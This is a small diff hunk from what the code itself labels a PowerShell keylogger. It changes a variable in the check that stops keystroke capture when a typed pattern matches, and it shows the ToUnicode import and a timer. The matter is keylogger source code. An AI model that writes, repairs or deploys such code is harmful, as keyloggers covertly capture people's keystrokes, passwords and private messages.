@@ -44,7 +44,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
            }
          }
        }
-       if ($assoc.Length -ge 13 -and $string.Substring($string.Length -13) -eq $pattern) {
+       if ($assoc.Length -ge 13 -and $assoc.Substring($assoc.Length -13) -eq $pattern) {
         throw "exit the keylogger"
       }
 	if ($timer.elapsed.totalseconds -gt 60) {
